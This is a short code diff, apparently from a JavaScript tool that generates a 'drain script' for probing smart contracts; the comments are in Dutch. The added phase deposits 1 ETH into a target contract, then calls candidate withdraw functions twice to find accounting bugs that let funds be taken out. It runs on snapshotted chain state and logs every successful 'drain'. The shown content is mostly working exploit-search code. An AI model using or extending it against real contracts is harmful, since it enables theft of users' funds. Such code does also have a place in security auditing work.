@@ -125,6 +125,23 @@ function buildDrainScript(candidates, depositCands, tokens) {
       if (hits && hits.length) { for (const h of hits) console.log('[DRAIN] deposit+' + c.name + ' | ' + h.token + ' | ' + h.amt); drains++; }
     }
   }
+  // Fase 3: accounting-bug — deposit + DUBBELE withdraw (saldo niet ge-update na 1e withdraw)
+  for (const dep of DEPOSITS.slice(0, 2)) {
+    for (const c of CANDS) {
+      const depIface = new ethers.Contract(TARGET, ['function ' + dep.sig], signer);
+      const drIface = new ethers.Contract(TARGET, ['function ' + c.sig], signer);
+      const drArgs = argVariants(c.types)[0] || [];
+      const depArgs = argVariants(dep.types)[0] || [];
+      const snap = await provider.send('evm_snapshot', []);
+      const hits = await measure(async () => {
+        await depIface[dep.name](...depArgs, { gasLimit: 4000000, value: 10n ** 18n });
+        await drIface[c.name](...drArgs, { gasLimit: 4000000 });
+        await drIface[c.name](...drArgs, { gasLimit: 4000000 });
+      });
+      await provider.send('evm_revert', [snap]);
+      if (hits && hits.length) { for (const h of hits) console.log('[DRAIN] dubbel-' + c.name + ' | ' + h.token + ' | ' + h.amt); drains++; }
+    }
+  }
   console.log('[DRAIN-TEST-DONE] ' + CANDS.length + ' functies getest, ' + drains + ' drains');
   `;
 }
